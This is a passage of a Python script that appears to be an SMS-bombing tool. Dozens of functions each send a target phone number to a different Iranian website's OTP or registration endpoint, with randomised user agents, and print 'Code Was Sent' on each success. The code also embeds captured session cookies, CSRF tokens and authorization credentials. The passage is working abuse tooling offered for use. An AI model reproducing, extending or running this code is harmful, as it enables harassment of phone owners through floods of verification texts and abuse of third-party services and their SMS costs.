analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad","TE": "Trailers"}
    sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone.split("+98")[1],"country_code":"+98","email":"example@gmail.com"}
    try:
        sTripR = post(timeout=5, url='https://www.snapptrip.com/register', headers=sTripH, json=sTripD).json()
        if sTripR['status_code'] == 200:
            print(f'{g}(Strip) {a}Code Was Sent')
            return True
    except:
        pass

def filmnet(phone):
    fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
    fNh = {'Connection': 'keep-alive',
    'Accept': 'application/json, text/plain, */*',
    'DNT': '1',
    'X-Platform': 'Web',
    'User-Agent': ua.random,
    'Origin': 'https://filmnet.ir',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://filmnet.ir/',
    'Accept-Language': 'fa,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'no-cache',
    'Accept-Encoding': 'gzip, deflate'}
    try:
        Filmnet = get(timeout=5, url=fnU, headers=fNh).json()
        if Filmnet['meta']['operation_result'] == 'success':
            print(f'{g}(Filmnet) {a}Code Was Sent')
            return True
    except:
        pass

def drdr(phone):
    dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
    drh = {'Connection': 'keep-alive',
    'Accept': 'application/json',
    'Authorization': 'hiToken',
    'User-Agent': ua.random,
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://drdr.ir',
    'Referer': 'https://drdr.ir/',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate'}
    try:
        drdr = post(timeout=5, url=dru, headers=drh, params={"phoneNumber":phone ,"userType":"PATIENT"}).json()
        if drdr['status'] == 'success':
            print(f'{g}(DrDr) {a}Code Was Sent')
            return True
    except:
        pass

def itool(phone):
    itJ = {'mobile': phone}
    itU = 'https://app.itoll.ir/api/v1/auth/login'
    itH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'fa',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://itoll.ir',
        'referer': 'https://itoll.ir/',
        'user-agent': ua.random
}
    try:
        ok = post(timeout=5, url=itU, headers=itH, json=itJ).json()
        if ok['success'] == True:
            print(f'{g}(Itool) {a}Code Was Sent')
            return True
    except:
        pass

def anar(phone):
    anrJ = {'user': phone, 'app_id': 99}
    anrU = 'https://api.anargift.com/api/people/auth'
    anrH = {
'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '34',
'content-type': 'application/json;charset=UTF-8',
'origin': 'https://anargift.com',
'referer': 'https://anargift.com/',
'user-agent': ua.random
    }
    try:
        ok = post(timeout=5, url=anrU, headers=anrH, json=anrJ).json()      
        if ok['status'] == True:
            print(f'{g}(AnarGift) {a}Code Was Sent')
            return True
    except :
        pass

def azki(phone):
    azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
    azkH = {
'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
'device': 'web',
'deviceid': '6',
'password': 'BimitoSecret',
'origin': 'https://www.azki.com',
'referer': 'https://www.azki.com/',
'user-agent': ua.random,
'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE',
'username': 'BimitoClient'
    }
    try:
        ok = post(timeout=5, url=azkU, headers=azkH).json()
        if ok["messageCode"] == 201:
            print(f'{g}(Azki) {a}Code Was Sent')
            return True
    except:
        pass

def nobat(phone):
    noJ = {'mobile': phone}
    noU = 'https://nobat.ir/api/public/patient/login/phone'
    noH = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'access-control-request-headers': 'nobat-cookie',
'access-control-request-method': 'POST',
'origin': 'https://user.nobat.ir',
'referer': 'https://user.nobat.ir/',
'user-agent': ua.random
    }
    try:
        ok = post(timeout=5, url=noU, headers=noH, json=noJ).json()
        if ok["status"] != 'failed':
            return True
    except:
        pass
def chmdon(phone):
    chJ = {
    "mobile": '0'+phone.split('+98')[1],
    "origin": "/",
    "referrer_id": None
    }
    chU = 'https://chamedoon.com/api/v1/membership/guest/request_mobile_verification'
    chH = {
'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json;charset=UTF-8',
'cookie': 'activity=%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D',
'origin': 'https://chamedoon.com',
'referer': 'https://chamedoon.com/',
'user-agent': ua.random
    }
    try:
        ok = post(timeout=5, url=chU, headers=chH, json=chJ).json()
        if ok["status"] == 'ok':
            print(f'{g}(Chamedoon) {a}Code Was Sent')
            return True
    except:
        pass
    
def bn(phone):
    bnJ = {
    "phone": '0'+phone.split('+98')[1]
}
    bnU = 'https://mobapi.banimode.com/api/v2/auth/request'
    bnH = {
'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Access-Control-Request-Headers': 'content-type,platform',
'Access-Control-Request-Method': 'POST',
'Connection': 'keep-alive',
'Host': 'mobapi.banimode.com',
'Origin': 'https://www.banimode.com',
'Referer': 'https://www.banimode.com/',
'user-agent': ua.random
    }
    try:
        ok = post(timeout=5, url=bnU, headers=bnH, json=bnJ).json()
        if ok["status"] == 'success':
            print(f'{g}(BaniMode) {a}Code Was Sent')
            return True
    except:
        pass
    
def lendo(phone):
    leD = {'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6',
'mobile': '0'+phone.split('+98')[1],
'password': 'ibvvb@3#9nc'}
    leU = 'https://lendo.ir/register?'
    leH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Cache-Control': 'max-age=0',
'Connection': 'keep-alive',
'Content-Type': 'application/x-www-form-urlencoded',
'Cookie': 'lendo_session=eyJpdiI6Imh2QXVnS3Q1ejFvQllhSVgzRTZORVE9PSIsInZhbHVlIjoicFE0VzJWc016a3BHXC9CRTE3S21OSXV0XC84U015VTJwdDBRVWZNUDRIUmxmS1gwSDR5NVEwQlhmaUlMdTM2XC9EQyIsIm1hYyI6ImMzMWRhYWE1ODA3MTE1ZGI5ZGIxNTAxNTg5NzBhNWYzNjZjNzk2MDNhYWNlNTU1OTc5ZTYzNjNmYWU5OGZiMWIifQ%3D%3D',
'Host': 'lendo.ir',
'Origin': 'https://lendo.ir',
'Referer': 'https://lendo.ir/register',
'Upgrade-Insecure-Requests': '1',
'user-agent': ua.random}
    try:
        lendoR = post(timeout=5, url=leU, headers=leH, data=leD).text
        if 'تایید شماره تلفن همراه' in lendoR:
            print(f'{g}(Lendo) {a}Code Was Sent')
            return True
    except:
        pass
def olgoo(phone):
    olD = {'contactInfo[mobile]': '0'+phone.split('+98')[1],
'contactInfo[agreementAccepted]': '1',
'contactInfo[teachingFieldId]': '1',
'contactInfo[eduGradeIds][7]': '7',
'submit_register': '1'}
    olU = 'https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox'
    olH = {'Accept': 'text/plain, */*; q=0.01',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'keep-alive',
'Content-Length': '163',
'Content-Type': 'application/x-www-form-urlencoded',
'Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5',
'Host': 'www.olgoobooks.ir',
'Origin': 'https://www.olgoobooks.ir',
'Referer': 'https://www.olgoobooks.ir/sn/userRegistration/',
'X-Requested-With': 'XMLHttpRequest',
'user-agent': ua.random}
    try:
        olgoo = post(timeout=5, url=olU, headers=olH, data=olD).text
        if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
            print(f'{g}(NashrOlgoo) {a}Code Was Sent')
            return True
    except:
        pass
    
def pakhsh(phone):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+98")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
    paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
    paH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '143',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'cookie': 'digits_countrycode=98; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d',
'origin': 'https://www.pakhsh.shop',
'referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/',
'user-agent': ua.random,
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
        if ok['code'] == '1':
            print(f'{g}(PakhshShop) {a}Code Was Sent')
            return True
    except:
        pass

def didnegar(phone):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split("+98")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+98")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
    paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
    paH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '143',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=98; _5f9d3331dba5a62b1268c532=true',
'origin': 'https://www.didnegar.com',
'referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1',
'user-agent': ua.random,
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
        if ok['code'] == '1':
            print(f'{g}(DideNegar) {a}Code Was Sent')
            return True
    except:
        pass

def baskol(phone):
    baJ = {
    "phone": '0'+phone.split('+98')[1]
}
    baU = 'https://www.buskool.com/send_verification_code'
    baH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json;charset=UTF-8',
'cookie': 'laravel_session=2Gp6A82VC8CPMgaB7sI0glrGP52XyjXNKnNAeZq3',
'origin': 'https://www.buskool.com',
'referer': 'https://www.buskool.com/register',
'user-agent': ua.random,
'x-csrf-token': 'trUVHIRWtjE58Fn9Pud1ciz2XaTbTgFHgCLsPykD',
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=baU, headers=baH, json=baJ).json()
        if ok['status'] == True:
            print(f'{g}(Baskol) {a}Code Was Sent')
            return True
    except:
        pass

def kilid(phone):
    kiJ = {
    "mobile": '0'+phone.split('+98')[1]
}
    kiU = 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL'
    kiH = {'Accept': 'application/json, text/plain, */*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'COUNTRY_ID': '2',
'Host': 'server.kilid.com',
'LOCALE': 'FA',
'Origin': 'https://kilid.com',
'Referer': 'https://kilid.com/',
'User-Agent': ua.random
}
    try:
        ok = post(timeout=5, url=kiU, headers=kiH, json=kiJ).json()
        if ok['status'] == 'SUCCESS':
            print(f'{g}(Kilid) {a}Code Was Sent')
            return True
    except:
        pass

def basalam(phone):
    baJ = {
    "variables": {
        "mobile": '0'+phone.split('+98')[1]
    },
    "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"
}
    baU = 'https://api.basalam.com/user'
    baH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'authorization': 'Bearer undefined',
'content-length': '168',
'content-type': 'application/json;charset=UTF-8',
'origin': 'https://basalam.com',
'referer': 'https://basalam.com/',
'user-agent': ua.random,
'x-client-info': '{"name":"web.public"}',
'x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
    try:
        ok = post(timeout=5, url=baU, headers=baH, json=baJ)
        if ok.status_code == 200:
            print(f'{g}(BaSalam) {a}Code Was Sent')
            return True
    except:
        pass

def ghabzino(phone):
    ghJ = {
    "Parameters": {
        "ApplicationType": "Web",
        "ApplicationUniqueToken": None,
        "ApplicationVersion": "1.0.0",
        "MobileNumber": '0'+phone.split('+98')[1]
    }
}
    ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    ghH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json',
'origin': 'https://ghabzino.com',
'referer': 'https://ghabzino.com/',
'user-agent': ua.random}
    try:
        ok = get(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        if ok["Parameters"] != None:
            print(f'{g}(Ghabzino) {a}Code Was Sent')
            return True
    except:
        pass

def simkhanF(phone):
    ghJ = {
    "mobileNumber": '0'+phone.split('+98')[1],
    "ReSendSMS": False
}
    ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
    ghH = {'Accept': 'application/json',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Authorization': 'Bearer undefined',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'www.simkhanapi.ir',
'Origin': 'https://simkhan.ir',
'Referer': 'https://simkhan.ir/',
'User-Agent': ua.random}
    try:
        ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
            print(f'{g}(SimKhan) {a}Code Was Sent')
            return True
    except:
        pass

def simkhanT(phone):
    ghJ = {
    "mobileNumber": '0'+phone.split('+98')[1],
    "ReSendSMS": True
}
    ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
    ghH = {'Accept': 'application/json',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Authorization': 'Bearer undefined',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'www.simkhanapi.ir',
'Origin': 'https://simkhan.ir',
'Referer': 'https://simkhan.ir/',
'User-Agent': ua.random}
    try:
        ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
            print(f'{g}(SimKhan) {a}Code Was Sent')
            return True
    except:
        pass

def drsaina(phone):
    ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone.split('+98')[1]}&confirmCode=&fullName=&Password=&Password2="
    ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
    ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cache-control': 'max-age=0',
'content-type': 'application/x-www-form-urlencoded',
'cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true',
'origin': 'https://www.drsaina.com',
'referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation',
'upgrade-insecure-requests': '1',
'user-agent': ua.random}
    try:
        ok = post(timeout=5, url=ghU, headers=ghH, data=ghD).text
        if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
            print(f'{g}(DrSaina) {a}Code Was Sent')
            return True
    except:
        pass
# MadeBy: @Amirprx3
def binjo(phone):
    ghU = f"https://api.binjo.ir/api/panel/get_code/{'0'+phone.split('+98')[1]}"
    ghH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Cache-Control': 'max-age=0',
'Connection': 'keep-alive',
'Cache-Control': 'no-cache, private',
'Content-Encoding': 'gzip',
'Content-Type': 'application/json',
'Cookie': 'laravel_session=eyJpdiI6InY0T2JYTndZb0xacURzcXFtWWxORHc9PSIsInZhbHVlIjoiUmo1bVd0UklmdjJyc1wvZGNHVDRuRU96RVZVZFhpb1N4ZmJ3NkduUGJYMGhyRG42QVNwVUNHVlZZRUNqV0hjUysiLCJtYWMiOiIzNTBlOWIzOTkxMDYyM2EzNzViYWFhYjdkM2FlNjQ1YmZjOTU3NzNiMjRlYjNlMmZiZmQzOGRkZTI0Yzc0NTU1In0%3D',
'Host': 'api.binjo.ir',
'Upgrade-Insecure-Requests': '1',
'User-Agent': ua.random}
    try:
        ok = get(timeout=5, url=ghU, headers=ghH, verify=False).json()
        if ok['status'] == 'ok':
            print(f'{g}(BinJo) {a}Code Was Sent')
            return True
    except:
        pass

def limome(phone):
    liD = {'mobileNumber': phone.split('+98')[1],
'country': '1'}
    liU = 'https://my.limoome.com/api/auth/login/otp'
    liH = {'Accept': 'application/json, text/javascript, */*; q=0.01',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'keep-alive',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1',
'Host': 'my.limoome.com',
'Origin': 'https://my.limoome.com',
'Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment',
'User-Agent': ua.random,
'X-Requested-With': 'XMLHttpRequest'}
    try:
        liR = post(timeout=5, url=liU, headers=liH, data=liD).json()
        if liR['status'] == 'success':
            print(f'{g}(Limome) {a}Code Was Sent')
            return True
    except:
        pass

def bimito(phone):
    liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+98')[1]}%22%7D"
    liH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60',
'device': 'web',
'deviceid': '3',
'origin': 'https://bimito.com',
'referer': 'https://bimito.com/',
'user-agent': ua.random,
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        liR = post(timeout=5, url=liU, headers=liH).json()
        if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
            print(f'{g}(BimitoVip) {a}Code Was Sent')
            return True
    except:
        pass

def bimitoVip(phone):
    liU = f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220{phone.split('+98')[1]}%22%7D"
    liH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60',
'device': 'web',
'deviceid': '3',
'origin': 'https://bimito.com',
'referer': 'https://bimito.com/',
'user-agent': ua.random,
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        liR = post(timeout=5, url=liU, headers=liH).json()
        if liR['message'] == 'کاربر قبلا ثبت نام نشده است':
            print(f'{g}(BimitoVip) {a}Code Was Sent')
            return True
    except:
        pass
# MadeBy: @Amirprx3
def seebirani(phone):
    liJ = {
    "username": "0"+phone.split('+98')[1]
}
    liU = "https://sandbox.sibirani.ir/api/v1/user/invite"
    liH = {'accept': 'application/json',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json',
'origin': 'https://developer.sibirani.com',
'referer': 'https://developer.sibirani.com/',
'user-agent': ua.random}
    try:
        post(timeout=5, url=liU, headers=liH, json=liJ)
        print(f'{g}(SeebIrani) {a}Code Was Sent')
        return True
    except:
        pass

def mihanpezeshk(phone):
    gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+98")[1]}&recaptcha='
    gaU = 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient'
    gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cache-control': 'max-age=0',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'XSRF-TOKEN=eyJpdiI6IitzYVZRQzFLdGlKNHRHRjIxb3R4VWc9PSIsInZhbHVlIjoianR6SXBJXC9rUStMRCs0ajUzalNjM1pMN053bUNtSlJ5dzYrVzFxV1dtXC9SREp4OTJ0Wm1RWW9yRVwvM29Cc3l4SCIsIm1hYyI6IjdjODczZWI4Y2Q2N2NhODVkNjE5YTRkOWVhNjRhNDRlNmViZjhlNDVkNDYwODFkNzViOTU2ZTdjYTUwZjhjMWUifQ%3D%3D; laravel_session=eyJpdiI6ImU3dlpRdXV1XC9TMmJEWk1LMkFTZGJRPT0iLCJ2YWx1ZSI6IktHTWF0bFlJU0VqVCthamp5aW1GRHdBM1lNcjNMcVFxMWM5Ynd3clZLQzdva2ZJWXRiRU4xaUhyMnVHMG90RkUiLCJtYWMiOiJkZWRmMGM5YzFiNDNiOTJjYWFiZDc0MjYxMDUyMzBmYTMzMmI5ZTBkODA1YTMxODQyYzM2NjVjZWExZmYwMzdhIn0%3D',
'origin': 'https://www.mihanpezeshk.com',
'referer': 'https://www.mihanpezeshk.com/confirmcodePatient',
'upgrade-insecure-requests': '1',
'user-agent': ua.random}
    try:# MadeBy: @Amirprx3
        gaR = post(url=gaU, headers=gaH, data=gaD)
        print(f'{g}(MihanPezeshk) {a}Code Was Sent')
        return True
    except:
        pass

def mek(phone):
    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
    meH = {
"Accept": "application/json",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.5",
"Connection": "keep-alive",
"Content-Type": "application/json",
"Cookie": "_ga=GA1.2.1307952465.1641249170; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2527d893-9de1-8fee-9f73-d666992dd3d5; _yngt=9d6ba2d2-fd1c-4dcc-9f77-e1e364af4434; _hjSessionUser_619539=eyJpZCI6IjcyOTJiODRhLTA2NGUtNTA0Zi04Y2RjLTA2MWE3ZDgxZDgzOSIsImNyZWF0ZWQiOjE2NDEyNDkxNzEzMTUsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.284804399.1642278349; _gat_gtag_UA_106934660_1=1; _gat_UA-0000000-1=1; analytics_session_token=238e3f23-aff7-8e3a-f1d4-ef4f6c471e2b; yektanet_session_last_activity=1/15/2022; _yngt_iframe=1; _gat_UA-106934660-1=1; _hjIncludedInSessionSample=0; _hjSession_619539=eyJpZCI6IjRkY2U2ODUwLTQzZjktNGM0Zi1iMWUxLTllY2QzODA3ODhiZCIsImNyZWF0ZWQiOjE2NDIyNzgzNTYzNjgsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0",
"Host": "www.hamrah-mechanic.com",
"Origin": "https://www.hamrah-mechanic.com",
"Referer": "https://www.hamrah-mechanic.com/membersignin/",
"Source": "web",
"TE": "trailers",
"User-Agent": ua.random
}
    meD = {
	"landingPageUrl": "https://www.hamrah-mechanic.com/",
	"orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
	"phoneNumber": "0"+phone.split("+98")[1],
	"prevDomainUrl": None,
	"prevUrl": None,
	"referrer": "https://www.google.com/"
}
    try:
        meR = post(url=meU, headers=meH, data=meD).json()
        if meR['isSuccess']:
            print(f'{g}(HamrahMechanic) {a}Code Was Sent')
            return True
    except: 
        pass

def zarrinpal(phone):
        url = "https://www.zarinpal.com/api/v4/auth/register"
        headers = {
            "Host": "www.zarinpal.com", "content-length": "23", "accept": "application/json",
            "user-agent": ua.random, "content-type": "application/json", "origin": "https://www.zarinpal.com",
            "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
            "referer": "https://www.zarinpal.com/", "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        json_data = {"phone": phone}
        try:
            requests.post(url, json=json_data, headers=headers)
        except:
            pass

def shahreketab(phone):
        url = "https://www.shahreketabonline.com/api/v1/auth/register"
        headers = {
            "Host": "www.shahreketabonline.com", "content-length": "22", "accept": "application/json",
            "user-agent": ua.random, "content-type": "application/json", "origin": "https://www.shahreketabonline.com",
            "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty",
            "referer": "https://www.shahreketabonline.com/", "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        json_data = {"mobile": phone}
        try:
